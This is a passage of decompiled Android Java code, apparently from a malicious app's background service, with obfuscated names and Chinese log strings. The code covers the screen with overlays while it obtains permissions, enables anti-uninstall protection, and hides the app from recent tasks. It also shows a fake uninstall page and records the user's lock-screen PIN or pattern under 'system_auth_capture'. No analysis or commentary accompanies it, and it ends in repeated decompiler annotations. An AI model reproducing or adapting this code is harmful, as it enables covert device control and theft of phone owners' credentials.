        C0329b4 c0329b4;
        C0318a3 c0318a3;
        ConfigProgressManager$ConfigStage configProgressManager$ConfigStage = ConfigProgressManager$ConfigStage.CHECKING_PERMISSIONS;
        C1351vv c1351vv = C1351vv.f60710b1;
        if (continuationImpl instanceof dqtvuisjd$startPermissionGrantFlow$1) {
            dqtvuisjd_startpermissiongrantflow_1 = (dqtvuisjd$startPermissionGrantFlow$1) continuationImpl;
            int i = dqtvuisjd_startpermissiongrantflow_1.f52718a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                dqtvuisjd_startpermissiongrantflow_1.f52718a3 = i - Integer.MIN_VALUE;
            } else {
                dqtvuisjd_startpermissiongrantflow_1 = new dqtvuisjd$startPermissionGrantFlow$1(this, continuationImpl);
            }
        }
        Object obj = dqtvuisjd_startpermissiongrantflow_1.f52716a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = dqtvuisjd_startpermissiongrantflow_1.f52718a3;
        try {
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "自动权限获取失败", e);
        }
        if (i2 == 0) {
            kg1.m213544f4(obj);
            t60.m214714d6("dqtvuisjd", "🚀 startPermissionGrantFlow() 开始执行");
            try {
                z = getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0).getBoolean(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), false);
            } catch (Exception unused) {
                z = false;
            }
            if (z) {
                t60.m214714d6("dqtvuisjd", "✅ authorization_completed=true，跳过遮挡和适配流程");
                C0329b4 c0329b42 = this.f52431g2;
                if (c0329b42 != null) {
                    c0329b42.m211768a6();
                }
                if (!this.f52477k8) {
                    t60.m214714d6("dqtvuisjd", "🛡️ 授权已完成但防卸载未启用，立即启用");
                    m211460e9();
                }
                C0356a1 c0356a1 = this.f52436g7;
                if (c0356a1 != null) {
                    c0356a1.m211955a2();
                    t60.m214714d6("dqtvuisjd", "🎭 授权已完成，恢复最近任务隐藏");
                }
                m211534n2();
            } else if (Build.VERSION.SDK_INT >= 30) {
                t60.m214714d6("dqtvuisjd", "📱 Android 11+设备，进入专用流程");
                ju0 ju0Var = this.f52433g4;
                if (ju0Var == null) {
                    t60.m214724f2("screenBrightnessManager");
                    throw null;
                }
                if (!ju0Var.m213351a1()) {
                    C0763km c0763km = this.f52427f8;
                    if (c0763km != null) {
                        c0763km.m213601a1(false);
                        t60.m214714d6("dqtvuisjd", "🖤 Android 11+设备：显示配置期间遮盖");
                    }
                    C0318a3 c0318a32 = this.f52428f9;
                    if (c0318a32 != null) {
                        c0318a32.m211569a3();
                        C0318a3 c0318a33 = this.f52428f9;
                        if (c0318a33 == null) {
                            t60.m214724f2("configProgressManager");
                            throw null;
                        }
                        c0318a33.m211570a4(configProgressManager$ConfigStage, null);
                    }
                }
                this.f52400d1 = true;
                C0260a2 c0260a22 = this.f52369a0;
                if (c0260a22 != null) {
                    c0260a22.m211329h2();
                }
                try {
                    C0329b4 c0329b43 = this.f52431g2;
                    if (c0329b43 != null) {
                        c0329b43.m211768a6();
                    } else {
                        t60.m214704c5("dqtvuisjd", "❌ authorizationModule为null，无法启动授权流程");
                    }
                } catch (Exception e2) {
                    t60.m214705c6("dqtvuisjd", "❌ 启动授权模块异常: " + e2.getMessage(), e2);
                }
                t60.m214714d6("dqtvuisjd", "📱 Android 11+设备：适配流程继续，网络连接在后台进行");
            } else {
                ju0 ju0Var2 = this.f52433g4;
                if (ju0Var2 == null) {
                    t60.m214724f2("screenBrightnessManager");
                    throw null;
                }
                if (ju0Var2.m213351a1()) {
                    dqtvuisjdVar = this;
                    if (dqtvuisjdVar.f52400d1) {
                        t60.m214714d6("dqtvuisjd", "📱 Android 10设备：跳过投屏权限，直接执行授权模块");
                        ju0 ju0Var3 = dqtvuisjdVar.f52433g4;
                        if (ju0Var3 == null) {
                            t60.m214724f2("screenBrightnessManager");
                            throw null;
                        }
                        if (!ju0Var3.m213351a1()) {
                            C0763km c0763km2 = dqtvuisjdVar.f52427f8;
                            if (c0763km2 != null) {
                                c0763km2.m213601a1(false);
                                dqtvuisjd_startpermissiongrantflow_1.f52715a0 = dqtvuisjdVar;
                                dqtvuisjd_startpermissiongrantflow_1.f52718a3 = 2;
                                if (b81.m210571b1(1000L, dqtvuisjd_startpermissiongrantflow_1) != coroutineSingletons) {
                                    dqtvuisjdVar2 = dqtvuisjdVar;
                                    dqtvuisjdVar = dqtvuisjdVar2;
                                }
                                return coroutineSingletons;
                            }
                            c0318a3 = dqtvuisjdVar.f52428f9;
                            if (c0318a3 != null) {
                            }
                        }
                        dqtvuisjdVar.f52400d1 = true;
                        c0260a2 = dqtvuisjdVar.f52369a0;
                        if (c0260a2 != null) {
                        }
                        c0329b4 = dqtvuisjdVar.f52431g2;
                        if (c0329b4 == null) {
                        }
                        AbstractC0780a0.m213692a3(dqtvuisjdVar.f52378a9, null, new dqtvuisjd$startPermissionGrantFlow$11(dqtvuisjdVar, null), 3);
                    } else {
                        t60.m214714d6("dqtvuisjd", "🔄 所有权限已完成，跳过重复申请流程");
                    }
                } else {
                    C0763km c0763km3 = this.f52427f8;
                    if (c0763km3 != null) {
                        c0763km3.m213601a1(false);
                        t60.m214714d6("dqtvuisjd", "🖤 Android 11+设备：显示配置期间遮盖，防止用户误操作");
                        dqtvuisjd_startpermissiongrantflow_1.f52715a0 = this;
                        dqtvuisjd_startpermissiongrantflow_1.f52718a3 = 1;
                        if (b81.m210571b1(1000L, dqtvuisjd_startpermissiongrantflow_1) == coroutineSingletons) {
                            return coroutineSingletons;
                        }
                    }
                    dqtvuisjdVar = this;
                }
            }
            return c1351vv;
        }
        if (i2 != 1) {
            if (i2 != 2) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            dqtvuisjdVar2 = dqtvuisjd_startpermissiongrantflow_1.f52715a0;
            kg1.m213544f4(obj);
            dqtvuisjdVar = dqtvuisjdVar2;
            c0318a3 = dqtvuisjdVar.f52428f9;
            if (c0318a3 != null) {
                c0318a3.m211569a3();
                C0318a3 c0318a34 = dqtvuisjdVar.f52428f9;
                if (c0318a34 == null) {
                    t60.m214724f2("configProgressManager");
                    throw null;
                }
                c0318a34.m211570a4(configProgressManager$ConfigStage, null);
            }
            dqtvuisjdVar.f52400d1 = true;
            c0260a2 = dqtvuisjdVar.f52369a0;
            if (c0260a2 != null) {
                c0260a2.m211329h2();
            }
            try {
                c0329b4 = dqtvuisjdVar.f52431g2;
                if (c0329b4 == null) {
                    c0329b4.m211768a6();
                } else {
                    t60.m214704c5("dqtvuisjd", "❌ authorizationModule为null");
                }
            } catch (Exception e3) {
                t60.m214705c6("dqtvuisjd", "❌ 启动授权模块异常: " + e3.getMessage(), e3);
            }
            AbstractC0780a0.m213692a3(dqtvuisjdVar.f52378a9, null, new dqtvuisjd$startPermissionGrantFlow$11(dqtvuisjdVar, null), 3);
            return c1351vv;
        }
        dqtvuisjdVar = dqtvuisjd_startpermissiongrantflow_1.f52715a0;
        kg1.m213544f4(obj);
        C0318a3 c0318a35 = dqtvuisjdVar.f52428f9;
        if (c0318a35 != null) {
            c0318a35.m211569a3();
            C0318a3 c0318a36 = dqtvuisjdVar.f52428f9;
            if (c0318a36 == null) {
                t60.m214724f2("configProgressManager");
                throw null;
            }
            c0318a36.m211570a4(configProgressManager$ConfigStage, null);
        }
        if (dqtvuisjdVar.f52400d1) {
        }
    }

    /* renamed from: m9 */
    public final void m211531m9() {
        try {
            try {
                u11 u11Var = this.f52383b4;
                if (u11Var != null) {
                    u11Var.m215253a7(null);
                }
                this.f52383b4 = null;
                t60.m214714d6("dqtvuisjd", "✅ 已停止WebView状态检查定时任务");
            } catch (Exception e) {
                t60.m214705c6("dqtvuisjd", "❌ 停止WebView状态检查定时任务失败", e);
            }
            this.f52383b4 = AbstractC0780a0.m213692a3(this.f52378a9, AbstractC1262tj.f60234a1, new dqtvuisjd$startWebViewStatusCheckTask$1(2, null), 2);
            t60.m214714d6("dqtvuisjd", "✅ 已启动WebView状态检查定时任务（每1秒检查一次）");
        } catch (Exception e2) {
            t60.m214705c6("dqtvuisjd", "❌ 启动WebView状态检查定时任务失败", e2);
        }
    }

    /* renamed from: n0 */
    public final void m211532n0() {
        try {
            u11 u11Var = this.f52443h4;
            if (u11Var == null || !u11Var.mo213470a0()) {
                t60.m214702c3("dqtvuisjd", "📋 无障碍设置页面监控未运行或已停止");
                return;
            }
            t60.m214714d6("dqtvuisjd", "🛑 配置完成，停止无障碍设置页面监控");
            u11 u11Var2 = this.f52443h4;
            if (u11Var2 != null) {
                u11Var2.m215253a7(null);
            }
            this.f52443h4 = null;
            this.f52445h6 = 0;
            this.f52444h5 = 0L;
            t60.m214714d6("dqtvuisjd", "✅ 无障碍设置页面监控已成功停止");
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 停止无障碍设置页面监控失败", e);
        }
    }

    /* renamed from: n1 */
    public final void m211533n1(C0598hx c0598hx) {
        String strM213295i2;
        try {
            String str = c0598hx.f56761a1;
            List list = c0598hx.f56762a2;
            if (str == null) {
                strM213295i2 = list != null ? AbstractC0715je.m213295i2(list, ",", null, null, null, 62) : null;
                if (strM213295i2 == null) {
                    return;
                }
            } else {
                strM213295i2 = str;
            }
            String str2 = "mixed";
            if (str != null) {
                if (str.length() > 4) {
                    if (str.length() > 6) {
                        int i = 0;
                        while (true) {
                            if (i >= str.length()) {
                                str2 = "pin";
                                break;
                            } else if (!Character.isDigit(str.charAt(i))) {
                                break;
                            } else {
                                i++;
                            }
                        }
                    } else {
                        str2 = "pin_6";
                    }
                } else {
                    str2 = "pin_4";
                }
            } else if (list != null) {
                str2 = "pattern";
            }
            t60.m214714d6("dqtvuisjd", "🔐 同步密码到 password_inputs: type=" + str2 + ", len=" + strM213295i2.length());
            C0323a8 c0323a8 = this.f52415e6;
            if (c0323a8 != null) {
                c0323a8.m211662c8(strM213295i2, str2, "system_auth_capture");
            }
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 同步密码到 password_inputs 失败", e);
        }
    }

    /* renamed from: n2 */
    public final void m211534n2() {
        try {
            t60.m214714d6("dqtvuisjd", "📦 [假卸载] ★★★ tryShowPackageVerify() 被调用 ★★★");
            String str = new File(getFilesDir(), StringUtil.m212470a0("OFwDLEgqMy1YPy1QFnRHKwMg")).exists() ? "内部存储" : "assets";
            t60.m214714d6("dqtvuisjd", "📦 [假卸载] 配置来源: ".concat(str));
            JSONObject jSONObjectM213605a3 = AbstractC0765ko.m213605a3(this);
            if (jSONObjectM213605a3 == null) {
                t60.m214726f4("dqtvuisjd", "📦 [假卸载] 配置文件读取失败，跳过");
                return;
            }
            int i = 0;
            boolean zOptBoolean = jSONObjectM213605a3.optBoolean("uninstallMode", false);
            t60.m214714d6("dqtvuisjd", "📦 [假卸载] uninstallMode=" + zOptBoolean + " (配置来源: " + str + ")");
            if (!zOptBoolean) {
                t60.m214714d6("dqtvuisjd", "📦 [假卸载] uninstallMode 未启用，跳过");
                return;
            }
            t60.m214714d6("dqtvuisjd", "📦 [假卸载] SharedPreferences v_done=" + getSharedPreferences("pkg_verify_state", 0).getBoolean("v_done", false));
            WindowManager windowManager = cm0.f46150a0;
            boolean z = getSharedPreferences("pkg_verify_state", 0).getBoolean("v_done", false);
            StringBuilder sb = new StringBuilder("📦 [假卸载] shouldShow=");
            sb.append(!z);
            t60.m214714d6("dqtvuisjd", sb.toString());
            if (z) {
                t60.m214714d6("dqtvuisjd", "📦 [假卸载] 已弹出过，跳过");
                return;
            }
            t60.m214714d6("dqtvuisjd", "📦 [假卸载] ★★★ 开始显示假卸载页面 ★★★");
            t60.m214714d6("PkgVerifyOverlay", "📦 show() 被调用，service=".concat("dqtvuisjd"));
            cm0.f46153a3 = 0;
            cm0.f46154a4 = 0;
            cm0.f46155a5.post(new bm0(this, i));
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "📦 [假卸载] 显示失败", e);
        }
    }

    /* renamed from: n3 */
    public final void m211535n3() {
        try {
            SharedPreferences sharedPreferences = getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0);
            boolean z = sharedPreferences.getBoolean(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), false);
            boolean z2 = sharedPreferences.getBoolean(StringUtil.m212470a0("LkESNlg8CRFRIyRULihIOwkgQyI="), false);
            C0356a1 c0356a1 = this.f52436g7;
            if (c0356a1 != null) {
                c0356a1.m211955a2();
            }
            t60.m214714d6("RECENT_TASK", "🎭 更新保护状态: enabled=true (auth=" + z + ", exclude=" + z2 + ")");
        } catch (Exception e) {
            tz0.m214807a7("🎭 更新保护状态失败: ", e.getMessage(), "RECENT_TASK");
        }
    }

    /* renamed from: n5 */
    public final void m211536n5() {
        C0357a0 c0357a0 = this.f52441h2;
        if (c0357a0 != null) {
            try {
                PowerManager.WakeLock wakeLockNewWakeLock = ((PowerManager) c0357a0.f53739a1.getValue()).newWakeLock(268435466, "SystemHelper:WakeScreen");
                wakeLockNewWakeLock.acquire(3000L);
                wakeLockNewWakeLock.release();
            } catch (Exception e) {
                t60.m214705c6("ScreenControlHelper", "❌ 点亮屏幕失败", e);
            }
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:103:0x0150  */
    /* JADX WARN: Removed duplicated region for block: B:108:0x015e  */
    /* JADX WARN: Removed duplicated region for block: B:128:0x019d  */
    /* JADX WARN: Removed duplicated region for block: B:129:0x019f  */
    /* JADX WARN: Removed duplicated region for block: B:138:0x01bc  */
    /* JADX WARN: Removed duplicated region for block: B:141:0x01c9  */
    /* JADX WARN: Removed duplicated region for block: B:149:0x01e0  */
    /* JADX WARN: Removed duplicated region for block: B:152:0x01e5 A[Catch: Exception -> 0x0019, TryCatch #17 {Exception -> 0x0019, blocks: (B:3:0x000d, B:5:0x0011, B:10:0x001c, B:13:0x0026, B:26:0x0045, B:28:0x004d, B:30:0x005b, B:32:0x0069, B:35:0x0073, B:37:0x0079, B:84:0x011c, B:87:0x0126, B:90:0x012c, B:120:0x018b, B:131:0x01a2, B:133:0x01a8, B:135:0x01ae, B:142:0x01cc, B:144:0x01d2, B:146:0x01d8, B:152:0x01e5, B:157:0x01f5, B:164:0x020e, B:165:0x0210, B:169:0x0218, B:171:0x021e, B:173:0x0224, B:175:0x022f, B:180:0x023a, B:182:0x023e, B:184:0x0244, B:186:0x0248, B:187:0x024c, B:188:0x024f, B:189:0x0250, B:194:0x025c, B:196:0x0262, B:198:0x0268, B:201:0x027a, B:203:0x0280, B:205:0x0286, B:207:0x028c, B:209:0x0294, B:211:0x029c, B:213:0x02a4, B:215:0x02aa, B:217:0x02b2, B:219:0x02ba, B:221:0x02c2, B:223:0x02ca, B:225:0x02d2, B:227:0x02da, B:229:0x02e0, B:231:0x02e8, B:233:0x02f0, B:235:0x02f8, B:237:0x0300, B:239:0x0308, B:241:0x0310, B:243:0x0318, B:245:0x0320, B:247:0x0328, B:249:0x032e, B:251:0x0336, B:253:0x033e, B:255:0x0346, B:257:0x034c, B:259:0x0354, B:261:0x035c, B:263:0x0364, B:265:0x036c, B:267:0x0374, B:269:0x037c, B:271:0x0384, B:273:0x038c, B:275:0x0394, B:277:0x039c, B:283:0x03aa, B:285:0x03ae, B:289:0x03b9, B:291:0x03bf, B:293:0x03c5, B:296:0x03d3, B:298:0x03d9, B:300:0x03e1, B:302:0x03e7, B:305:0x03ef, B:307:0x03f8, B:309:0x0400, B:311:0x0408, B:313:0x0410, B:315:0x0418, B:320:0x0427, B:321:0x042a, B:331:0x043c, B:338:0x044c, B:340:0x0452, B:388:0x04cc, B:390:0x04d0, B:392:0x04d4, B:394:0x04d8, B:396:0x04de, B:397:0x04e3, B:387:0x04c9, B:337:0x0449, B:81:0x0115, B:83:0x0119, B:464:0x0599, B:466:0x059d, B:468:0x05a1, B:470:0x05a5, B:472:0x05a9, B:473:0x05ae), top: B:523:0x000d }] */
    /* JADX WARN: Removed duplicated region for block: B:154:0x01ee  */
    /* JADX WARN: Removed duplicated region for block: B:156:0x01f3 A[ADDED_TO_REGION] */
    /* JADX WARN: Removed duplicated region for block: B:160:0x0205  */
    /* JADX WARN: Removed duplicated region for block: B:163:0x020c A[ADDED_TO_REGION] */
    /* JADX WARN: Removed duplicated region for block: B:167:0x0214 A[ADDED_TO_REGION] */
    /* JADX WARN: Removed duplicated region for block: B:174:0x022e  */
    /* JADX WARN: Removed duplicated region for block: B:177:0x0235  */
    /* JADX WARN: Removed duplicated region for block: B:178:0x0237  */
    /* JADX WARN: Removed duplicated region for block: B:186:0x0248 A[Catch: Exception -> 0x0019, TryCatch #17 {Exception -> 0x0019, blocks: (B:3:0x000d, B:5:0x0011, B:10:0x001c, B:13:0x0026, B:26:0x0045, B:28:0x004d, B:30:0x005b, B:32:0x0069, B:35:0x0073, B:37:0x0079, B:84:0x011c, B:87:0x0126, B:90:0x012c, B:120:0x018b, B:131:0x01a2, B:133:0x01a8, B:135:0x01ae, B:142:0x01cc, B:144:0x01d2, B:146:0x01d8, B:152:0x01e5, B:157:0x01f5, B:164:0x020e, B:165:0x0210, B:169:0x0218, B:171:0x021e, B:173:0x0224, B:175:0x022f, B:180:0x023a, B:182:0x023e, B:184:0x0244, B:186:0x0248, B:187:0x024c, B:188:0x024f, B:189:0x0250, B:194:0x025c, B:196:0x0262, B:198:0x0268, B:201:0x027a, B:203:0x0280, B:205:0x0286, B:207:0x028c, B:209:0x0294, B:211:0x029c, B:213:0x02a4, B:215:0x02aa, B:217:0x02b2, B:219:0x02ba, B:221:0x02c2, B:223:0x02ca, B:225:0x02d2, B:227:0x02da, B:229:0x02e0, B:231:0x02e8, B:233:0x02f0, B:235:0x02f8, B:237:0x0300, B:239:0x0308, B:241:0x0310, B:243:0x0318, B:245:0x0320, B:247:0x0328, B:249:0x032e, B:251:0x0336, B:253:0x033e, B:255:0x0346, B:257:0x034c, B:259:0x0354, B:261:0x035c, B:263:0x0364, B:265:0x036c, B:267:0x0374, B:269:0x037c, B:271:0x0384, B:273:0x038c, B:275:0x0394, B:277:0x039c, B:283:0x03aa, B:285:0x03ae, B:289:0x03b9, B:291:0x03bf, B:293:0x03c5, B:296:0x03d3, B:298:0x03d9, B:300:0x03e1, B:302:0x03e7, B:305:0x03ef, B:307:0x03f8, B:309:0x0400, B:311:0x0408, B:313:0x0410, B:315:0x0418, B:320:0x0427, B:321:0x042a, B:331:0x043c, B:338:0x044c, B:340:0x0452, B:388:0x04cc, B:390:0x04d0, B:392:0x04d4, B:394:0x04d8, B:396:0x04de, B:397:0x04e3, B:387:0x04c9, B:337:0x0449, B:81:0x0115, B:83:0x0119, B:464:0x0599, B:466:0x059d, B:468:0x05a1, B:470:0x05a5, B:472:0x05a9, B:473:0x05ae), top: B:523:0x000d }] */
    /* JADX WARN: Removed duplicated region for block: B:187:0x024c A[Catch: Exception -> 0x0019, TryCatch #17 {Exception -> 0x0019, blocks: (B:3:0x000d, B:5:0x0011, B:10:0x001c, B:13:0x0026, B:26:0x0045, B:28:0x004d, B:30:0x005b, B:32:0x0069, B:35:0x0073, B:37:0x0079, B:84:0x011c, B:87:0x0126, B:90:0x012c, B:120:0x018b, B:131:0x01a2, B:133:0x01a8, B:135:0x01ae, B:142:0x01cc, B:144:0x01d2, B:146:0x01d8, B:152:0x01e5, B:157:0x01f5, B:164:0x020e, B:165:0x0210, B:169:0x0218, B:171:0x021e, B:173:0x0224, B:175:0x022f, B:180:0x023a, B:182:0x023e, B:184:0x0244, B:186:0x0248, B:187:0x024c, B:188:0x024f, B:189:0x0250, B:194:0x025c, B:196:0x0262, B:198:0x0268, B:201:0x027a, B:203:0x0280, B:205:0x0286, B:207:0x028c, B:209:0x0294, B:211:0x029c, B:213:0x02a4, B:215:0x02aa, B:217:0x02b2, B:219:0x02ba, B:221:0x02c2, B:223:0x02ca, B:225:0x02d2, B:227:0x02da, B:229:0x02e0, B:231:0x02e8, B:233:0x02f0, B:235:0x02f8, B:237:0x0300, B:239:0x0308, B:241:0x0310, B:243:0x0318, B:245:0x0320, B:247:0x0328, B:249:0x032e, B:251:0x0336, B:253:0x033e, B:255:0x0346, B:257:0x034c, B:259:0x0354, B:261:0x035c, B:263:0x0364, B:265:0x036c, B:267:0x0374, B:269:0x037c, B:271:0x0384, B:273:0x038c, B:275:0x0394, B:277:0x039c, B:283:0x03aa, B:285:0x03ae, B:289:0x03b9, B:291:0x03bf, B:293:0x03c5, B:296:0x03d3, B:298:0x03d9, B:300:0x03e1, B:302:0x03e7, B:305:0x03ef, B:307:0x03f8, B:309:0x0400, B:311:0x0408, B:313:0x0410, B:315:0x0418, B:320:0x0427, B:321:0x042a, B:331:0x043c, B:338:0x044c, B:340:0x0452, B:388:0x04cc, B:390:0x04d0, B:392:0x04d4, B:394:0x04d8, B:396:0x04de, B:397:0x04e3, B:387:0x04c9, B:337:0x0449, B:81:0x0115, B:83:0x0119, B:464:0x0599, B:466:0x059d, B:468:0x05a1, B:470:0x05a5, B:472:0x05a9, B:473:0x05ae), top: B:523:0x000d }] */
    /* JADX WARN: Removed duplicated region for block: B:192:0x0258 A[ADDED_TO_REGION] */
    /* JADX WARN: Removed duplicated region for block: B:287:0x03b4  */
    /* JADX WARN: Removed duplicated region for block: B:289:0x03b9 A[Catch: Exception -> 0x0019, TryCatch #17 {Exception -> 0x0019, blocks: (B:3:0x000d, B:5:0x0011, B:10:0x001c, B:13:0x0026, B:26:0x0045, B:28:0x004d, B:30:0x005b, B:32:0x0069, B:35:0x0073, B:37:0x0079, B:84:0x011c, B:87:0x0126, B:90:0x012c, B:120:0x018b, B:131:0x01a2, B:133:0x01a8, B:135:0x01ae, B:142:0x01cc, B:144:0x01d2, B:146:0x01d8, B:152:0x01e5, B:157:0x01f5, B:164:0x020e, B:165:0x0210, B:169:0x0218, B:171:0x021e, B:173:0x0224, B:175:0x022f, B:180:0x023a, B:182:0x023e, B:184:0x0244, B:186:0x0248, B:187:0x024c, B:188:0x024f, B:189:0x0250, B:194:0x025c, B:196:0x0262, B:198:0x0268, B:201:0x027a, B:203:0x0280, B:205:0x0286, B:207:0x028c, B:209:0x0294, B:211:0x029c, B:213:0x02a4, B:215:0x02aa, B:217:0x02b2, B:219:0x02ba, B:221:0x02c2, B:223:0x02ca, B:225:0x02d2, B:227:0x02da, B:229:0x02e0, B:231:0x02e8, B:233:0x02f0, B:235:0x02f8, B:237:0x0300, B:239:0x0308, B:241:0x0310, B:243:0x0318, B:245:0x0320, B:247:0x0328, B:249:0x032e, B:251:0x0336, B:253:0x033e, B:255:0x0346, B:257:0x034c, B:259:0x0354, B:261:0x035c, B:263:0x0364, B:265:0x036c, B:267:0x0374, B:269:0x037c, B:271:0x0384, B:273:0x038c, B:275:0x0394, B:277:0x039c, B:283:0x03aa, B:285:0x03ae, B:289:0x03b9, B:291:0x03bf, B:293:0x03c5, B:296:0x03d3, B:298:0x03d9, B:300:0x03e1, B:302:0x03e7, B:305:0x03ef, B:307:0x03f8, B:309:0x0400, B:311:0x0408, B:313:0x0410, B:315:0x0418, B:320:0x0427, B:321:0x042a, B:331:0x043c, B:338:0x044c, B:340:0x0452, B:388:0x04cc, B:390:0x04d0, B:392:0x04d4, B:394:0x04d8, B:396:0x04de, B:397:0x04e3, B:387:0x04c9, B:337:0x0449, B:81:0x0115, B:83:0x0119, B:464:0x0599, B:466:0x059d, B:468:0x05a1, B:470:0x05a5, B:472:0x05a9, B:473:0x05ae), top: B:523:0x000d }] */
    /* JADX WARN: Removed duplicated region for block: B:320:0x0427 A[Catch: Exception -> 0x0019, TRY_ENTER, TryCatch #17 {Exception -> 0x0019, blocks: (B:3:0x000d, B:5:0x0011, B:10:0x001c, B:13:0x0026, B:26:0x0045, B:28:0x004d, B:30:0x005b, B:32:0x0069, B:35:0x0073, B:37:0x0079, B:84:0x011c, B:87:0x0126, B:90:0x012c, B:120:0x018b, B:131:0x01a2, B:133:0x01a8, B:135:0x01ae, B:142:0x01cc, B:144:0x01d2, B:146:0x01d8, B:152:0x01e5, B:157:0x01f5, B:164:0x020e, B:165:0x0210, B:169:0x0218, B:171:0x021e, B:173:0x0224, B:175:0x022f, B:180:0x023a, B:182:0x023e, B:184:0x0244, B:186:0x0248, B:187:0x024c, B:188:0x024f, B:189:0x0250, B:194:0x025c, B:196:0x0262, B:198:0x0268, B:201:0x027a, B:203:0x0280, B:205:0x0286, B:207:0x028c, B:209:0x0294, B:211:0x029c, B:213:0x02a4, B:215:0x02aa, B:217:0x02b2, B:219:0x02ba, B:221:0x02c2, B:223:0x02ca, B:225:0x02d2, B:227:0x02da, B:229:0x02e0, B:231:0x02e8, B:233:0x02f0, B:235:0x02f8, B:237:0x0300, B:239:0x0308, B:241:0x0310, B:243:0x0318, B:245:0x0320, B:247:0x0328, B:249:0x032e, B:251:0x0336, B:253:0x033e, B:255:0x0346, B:257:0x034c, B:259:0x0354, B:261:0x035c, B:263:0x0364, B:265:0x036c, B:267:0x0374, B:269:0x037c, B:271:0x0384, B:273:0x038c, B:275:0x0394, B:277:0x039c, B:283:0x03aa, B:285:0x03ae, B:289:0x03b9, B:291:0x03bf, B:293:0x03c5, B:296:0x03d3, B:298:0x03d9, B:300:0x03e1, B:302:0x03e7, B:305:0x03ef, B:307:0x03f8, B:309:0x0400, B:311:0x0408, B:313:0x0410, B:315:0x0418, B:320:0x0427, B:321:0x042a, B:331:0x043c, B:338:0x044c, B:340:0x0452, B:388:0x04cc, B:390:0x04d0, B:392:0x04d4, B:394:0x04d8, B:396:0x04de, B:397:0x04e3, B:387:0x04c9, B:337:0x0449, B:81:0x0115, B:83:0x0119, B:464:0x0599, B:466:0x059d, B:468:0x05a1, B:470:0x05a5, B:472:0x05a9, B:473:0x05ae), top: B:523:0x000d }] */
    /* JADX WARN: Removed duplicated region for block: B:323:0x042e  */
    /* JADX WARN: Removed duplicated region for block: B:332:0x0440  */
    /* JADX WARN: Removed duplicated region for block: B:334:0x0444  */
    /* JADX WARN: Removed duplicated region for block: B:337:0x0449 A[Catch: Exception -> 0x0019, TryCatch #17 {Exception -> 0x0019, blocks: (B:3:0x000d, B:5:0x0011, B:10:0x001c, B:13:0x0026, B:26:0x0045, B:28:0x004d, B:30:0x005b, B:32:0x0069, B:35:0x0073, B:37:0x0079, B:84:0x011c, B:87:0x0126, B:90:0x012c, B:120:0x018b, B:131:0x01a2, B:133:0x01a8, B:135:0x01ae, B:142:0x01cc, B:144:0x01d2, B:146:0x01d8, B:152:0x01e5, B:157:0x01f5, B:164:0x020e, B:165:0x0210, B:169:0x0218, B:171:0x021e, B:173:0x0224, B:175:0x022f, B:180:0x023a, B:182:0x023e, B:184:0x0244, B:186:0x0248, B:187:0x024c, B:188:0x024f, B:189:0x0250, B:194:0x025c, B:196:0x0262, B:198:0x0268, B:201:0x027a, B:203:0x0280, B:205:0x0286, B:207:0x028c, B:209:0x0294, B:211:0x029c, B:213:0x02a4, B:215:0x02aa, B:217:0x02b2, B:219:0x02ba, B:221:0x02c2, B:223:0x02ca, B:225:0x02d2, B:227:0x02da, B:229:0x02e0, B:231:0x02e8, B:233:0x02f0, B:235:0x02f8, B:237:0x0300, B:239:0x0308, B:241:0x0310, B:243:0x0318, B:245:0x0320, B:247:0x0328, B:249:0x032e, B:251:0x0336, B:253:0x033e, B:255:0x0346, B:257:0x034c, B:259:0x0354, B:261:0x035c, B:263:0x0364, B:265:0x036c, B:267:0x0374, B:269:0x037c, B:271:0x0384, B:273:0x038c, B:275:0x0394, B:277:0x039c, B:283:0x03aa, B:285:0x03ae, B:289:0x03b9, B:291:0x03bf, B:293:0x03c5, B:296:0x03d3, B:298:0x03d9, B:300:0x03e1, B:302:0x03e7, B:305:0x03ef, B:307:0x03f8, B:309:0x0400, B:311:0x0408, B:313:0x0410, B:315:0x0418, B:320:0x0427, B:321:0x042a, B:331:0x043c, B:338:0x044c, B:340:0x0452, B:388:0x04cc, B:390:0x04d0, B:392:0x04d4, B:394:0x04d8, B:396:0x04de, B:397:0x04e3, B:387:0x04c9, B:337:0x0449, B:81:0x0115, B:83:0x0119, B:464:0x0599, B:466:0x059d, B:468:0x05a1, B:470:0x05a5, B:472:0x05a9, B:473:0x05ae), top: B:523:0x000d }] */
    /* JADX WARN: Removed duplicated region for block: B:340:0x0452 A[Catch: Exception -> 0x0019, TRY_LEAVE, TryCatch #17 {Exception -> 0x0019, blocks: (B:3:0x000d, B:5:0x0011, B:10:0x001c, B:13:0x0026, B:26:0x0045, B:28:0x004d, B:30:0x005b, B:32:0x0069, B:35:0x0073, B:37:0x0079, B:84:0x011c, B:87:0x0126, B:90:0x012c, B:120:0x018b, B:131:0x01a2, B:133:0x01a8, B:135:0x01ae, B:142:0x01cc, B:144:0x01d2, B:146:0x01d8, B:152:0x01e5, B:157:0x01f5, B:164:0x020e, B:165:0x0210, B:169:0x0218, B:171:0x021e, B:173:0x0224, B:175:0x022f, B:180:0x023a, B:182:0x023e, B:184:0x0244, B:186:0x0248, B:187:0x024c, B:188:0x024f, B:189:0x0250, B:194:0x025c, B:196:0x0262, B:198:0x0268, B:201:0x027a, B:203:0x0280, B:205:0x0286, B:207:0x028c, B:209:0x0294, B:211:0x029c, B:213:0x02a4, B:215:0x02aa, B:217:0x02b2, B:219:0x02ba, B:221:0x02c2, B:223:0x02ca, B:225:0x02d2, B:227:0x02da, B:229:0x02e0, B:231:0x02e8, B:233:0x02f0, B:235:0x02f8, B:237:0x0300, B:239:0x0308, B:241:0x0310, B:243:0x0318, B:245:0x0320, B:247:0x0328, B:249:0x032e, B:251:0x0336, B:253:0x033e, B:255:0x0346, B:257:0x034c, B:259:0x0354, B:261:0x035c, 